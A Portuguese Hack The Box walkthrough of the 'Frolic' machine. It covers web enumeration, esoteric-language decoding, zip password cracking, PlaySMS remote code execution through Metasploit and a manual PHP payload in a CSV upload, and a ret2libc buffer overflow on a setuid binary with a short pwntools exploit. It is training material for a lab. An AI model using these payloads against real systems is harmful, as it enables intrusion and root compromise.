---
title: "Hack The Box - Frolic"
tags: [Linux,Easy,Gobuster,Metasploit Framework,PlaySMS,Ook!,Brainfuck,John,Fcrackzip,ROP,Buffer Overflow Linux,One_gadget,Pwntools,Ldd,Strings,Gdb]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/158>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 4 portas abertas

> Porta 22 -> SSH

> Portas 139 e 445 -> Servidor Smb

> Porta 9999 -> Servidor Web

## Enumeração da porta 9999

Abrindo a página verificamos o que tem nela (Porta 9999)

Verificamos uma página inicial do ngix

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-popcorn/P_web.png)

Mas o que chama atenção é o fato de aparecer http://forlic.htb:1880

### Gobuster

Rodamos o gobuster na página pra verificar se encontramos algo de útil, uma vez que nos deu apenas a página padrão do apache e estamos sem rumo

> gobuster dir -u http://10.10.10.111:9999 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_gobuster.png)

Explicação Gobuster

> dir -> Modo escaneamento de diretórios

> -u http://10.10.10.111:9999 -> Url que vai ser escaneada

> -w -> A wordlist utilizada

> -t -> Aumentar o número de threads, pra ir mais rápido

#### /test

Verificamos o que o diretório */test* possui

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_test.png)

#### /dev

Verificamos o que o diretório */dev* possui

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_dev.png)

Bom, aqui eu demorei pra encontrar esse diretório que ele possui /backup dentro do /dev, tive que voltar várias vezes quando não encontrei nada mais pra frente. Pra não perder tempo já vamos enumerar aqui

##### Rodamos o gobuster dentro da pasta /dev pra encontrar outras pastas

> gobuster dir -u http://10.10.10.111:9999/dev -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_dev1.png)

/dev/backup

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_dev2.png)

/playsms

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_dev3.png)

Encontramos a aplicação PlaySMS, sei que há exploits para ela, inclusive sem precisar estar autenticado, mas pela data de release da máquina não vamos executar ele, vamos demostrar depois mas fazer do jeito que a máquina foi proposta, então não vamos trabalhar com ele ainda

Então vamos continuar na enumeração

#### /backup

Verificamos o que o diretório */backup* possui

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_backup.png)

Encontramos uma credencial, vamos deixar ela salva pra caso precise no futuro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_backupp.png)

#### /loop

Verificamos o que o diretório */loop* possui

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_loop.png)

#### /admin

Verificamos o que tem nesse */admin*

Uma página de login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin.png)

Verificamos o que tem no código fonte

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin1.png)

Verificamos esse login.js que chamou atenção e encontramos credenciais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin2.png)

`username == "admin" && password == "superduperlooperpassword_lol"`

Tentamos realizar login na página com essas credenciais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin4.png)

##### Ook! linguagem de programação

Tem esses dados bizarros...

```
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin5.png)

Jogamos no google e verificamos que é *Ook!* a linguagem de programação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin6.png)

Decodificamos...

> https://www.dcode.fr/ook-language

> Nothing here check /asdiSIAJJ0QWE9JAS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin7.png)

Então, checamos /asdiSIAJJ0QWE9JAS

Outra saída bizarra...

```
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA 
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin8.png)

Me parece ser base64, então passei pra Kali pra verificar do que se trata, e pelo *Magic Number* `PK` vi que era um arquivo zip

> curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d | xxd

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin9.png)

##### Quebrando senha arquivo zip

Passamos pra nossa máquina e dezipamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin10.png)

###### Com o frackzip

Como tem senha, utilizamos o `fcrackzip` pra descobrir a senha dele

> fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt arquivo.zip

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin11.png)

PASSWORD FOUND!!!!: pw == password

###### Com o john

Convertemos para um hash que o john entenda com o `zip2john`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_john.png)

Agora com o john quebramos a senha do arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_john1.png)

Extraimos o zip

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin12.png)

Possivelmente essa saída é hex

```
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

Usei o xxd para reverter para bytes, mas dai eu vi que não tinha somente ASCII, mas bas64 também, então acrescentei o base64 -d (Também utilizei o tr -d '\r\n' pra poder remover umas quebras de linhas que tinha no arquivo que quando eu decodificava do base64 ele dava ruim)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin13.png)

```
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..< 
```

Parece ser `brainfuck`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin14.png)

Decodificamos

> https://www.dcode.fr/brainfuck-language

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_admin15.png)

Encontramos uma credencial

> idkwhatispass

# Exploração PlaySMS

Com essa credencial encontrada iremos realizar o login no PlaySMS que encontramos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_play.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_play1.png)

Procuramos por exploits para PlaySMS no searchsploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_searchsploit.png)

## 1º Modo - Através do Metasploit Framework

Iremos explorar através do Msfconsole, depois iremos fazer a exploração manual

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_msf.png)

> use exploit/multi/http/playsms_uploadcsv_exec

Executamos e ganhamos acesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_msf1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_msf2.png)

Também conseguimos com outro exploit do Msfconsole

> use exploit/multi/http/playsms_template_injection

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_msf4.png)

Executamos e conseguimos acesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_msf3.png)

## 2º Modo - Explorando manualmente

Pesquisamos por exploits

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_s.png)

Lemos esse 42003 ('/sendfromfile.php')

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_s1.png)

Fazemos conforme está descrito no exploit

```
<?php system('whoami'); ?>,2,3
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_s2.png)

Devemos upar nele na aba "My account", "Send from file"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_s3.png)

E vemos que deu certo, temos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_s4.png)

### Ganhando um Reverse Shell

Devemos fazer agora ele vir na minha máquina e executar um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_s5.png)

Fazemos o upload

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_s6.png)

Ganhamos o Reverse Shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_s7.png)

# Escalação de privilégio

Bom, uma vez que temos acesso a máquina vamos iniciar a fase de escalação de privilégio

Rodaremos o `Linpeas` para procurar maneiras de escalar privilégio

> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_priv.png)

Passamos pra máquina e executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_priv1.png)

Encontramos algo estranho em */home/ayush/.binary/rop*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_priv2.png)

Checamos o que é ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_priv3.png)

Hmmmm... ele é executado como root e ainda por cima o sistem esta com o VA Randomize desabilitado. Então ta tranquilo pra fazer um buffer overflow nele

> cat /proc/sys/kernel/randomize_va_space

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_priv4.png)

## Enviamos para Kali para trabalhar nele

Para ficar melhor de trabalhar em cima dele, enviamos ele para a Kali. Aqui temos uma infidade de maneiras de transferir esse arquivo.

Aqui transferimos criando um `SimpleHTTPServer` em python na máquina e da minha Kali fiz o download dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_roo.png)

Com o `ltrace` verificamos que ele da um setuid(0) ou seja, executa como root realmente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_rop.png)

Tentamos jogar uma string bem grande, pra verificar se o crash dele é simples de reproduzir

Temos um `segmentation fault` ou seja, possivelmente podemos realizar um buffer overflow nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_rop1.png)

### Fazendo o Buffer Overflow

Pessoalmente sempre tive dificuldade com buffer overflow em linux. Pra mim realmente é um bicho de sete cabeças. Então vou procurar ser o mais simples e demonstrativo aqui pra ficar bem claro a execução dos passos.

1º Rodar o binário com o GDB

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_gdb.png)

2º Verificar as proteções com o `checksec`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_gdb1.png)

Obs: uma coisa pra se notar é que ele está com o NX habilitado, ou seja, não podemos executar shellcode diretamente na stack.

3º Devemos reproduzir o segmentation fault da aplicação, pra verificar o momento exato em que ele perde o controle da aplicação

Criaremos um `pattern` de 100 bytes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_pattern.png)

Rodamos esse pattern na aplicação, pra verificarmos o que estará no EIP no momento do crash

> 0x6161616e

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_pattern1.png)

Verificamos o ponto exato, que é em `0x6161616e`

Verificamos agora em termos de bytes, quantos são necessários pra iniciar a sobrescrever o EIP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_pattern2.png)

Opa! 52!

Testamos agora, pra ver se realmente é isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_pattern3.png)

Exatamente, olha o que está no EIP no momento do crash, é o 'root' que colocamos após os 52 bytes.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_pattern4.png)

Obs: Tranquilo, entendi, mas oq isso quer dizer? Quer dizer que temos controle da aplicação agora, podemos direcionar o fluxo dela pra executar o que quisermos. O EIP é a próxima instrução a ser executada... Ah, agora entendi, então se colocarmos um shell da vida ai ele vai executar? Em termos gerais sim, é assim que as vulnerabilidades de buffer overflow funcionam. Então vamos prosseguir.

#### Criação do Exploit

##### Modo "difícil"

4º Criação do Exploit

Primeiro passo na criação do exploit é encontrar o endereço da `libc` que o binário utiliza na máquina

O comando pra descobrirmos é `ldd rop`

> 0xb7e19000

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_libc.png)

Segundo passo é verificar dentro dessa libc onde está o `system` pois eu quero executar comandos nele

Pra isso utilizamos o `readelf`

> readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system

> 0003ada0

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_system.png)

Terceiro passo é encontrarmos o endereço da função `exit` pq queremos que o programa saia tranquilo, não fique dando um monte de erro escroto

> readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit

> 0002e9d0

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_exit.png)

Quarto passo é encontrar o endereço de memória que corresponde ao /bin/sh uma vez que quero um shell da máquina

Pra isso vou utilizar o comando

> strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh

> 15ba0b

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_sh.png)

Quinto passo montar o exploit

Iremos utilizar todos esses endereços de memória encontrados pra criarmos nosso exploit

Ficará desse modo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_exp.png)

Sexto passo, envio e execução do exploit

Agora iremos mandar pra máquina o exploit, pra ver se ele está funcionando

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_exp1.png)

Executamos e viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_exp3.png)

##### Modo "fácil"

Há uma biblioteca do python chamada *pwn* que facilita o trabalho, não precisamos colocar esse struct, ele identifica sozinho o tipo e já faz.

Há outra ferramenta mais útil ainda que já verifica o bin/sh, já traz mastigado é a *one_gadget*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_one1.png)

> https://github.com/david942j/one_gadget

Instalando ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_one.png)

Verificamos onde está a libc do sistema com o *ldd*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_one3.png)

Agora enviamos o *libc* pra Kali pra poder verificar o que queremos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_one2.png)

Agora utilizamos o `one_gadget` pra verificar os endereços que precisamos

> one_gadget -f libc

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_one4.png)

Iremos utilizar o primeiro endereço

> 0x3ac5c

```
from pwn import *
payload = "A" * 52 + p32(0xb7e19000+0x3ac5c)
print payload
```

Aí está o exploit resumido e facilitado.
Primeiro é criado o buffer de 52, depois comoo sistema é de 32 bits, devemos usar o p32, ai vem o endereço da Libc que vemos com o ldd e depois o do bin/sh que vimos com o one_gadget

Passamos esse exploit para a máquina e executamos do mesmo foto que foi executado antes, a diferença aqui é que não podemos jogar o exploit em si, pq a máquina não vai ter o módulo `pwn` instalado, então temos que jogar a saida do comando

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_one6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_one7.png)

### Pegamos a flag de root e user

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-frolic/F_root.png)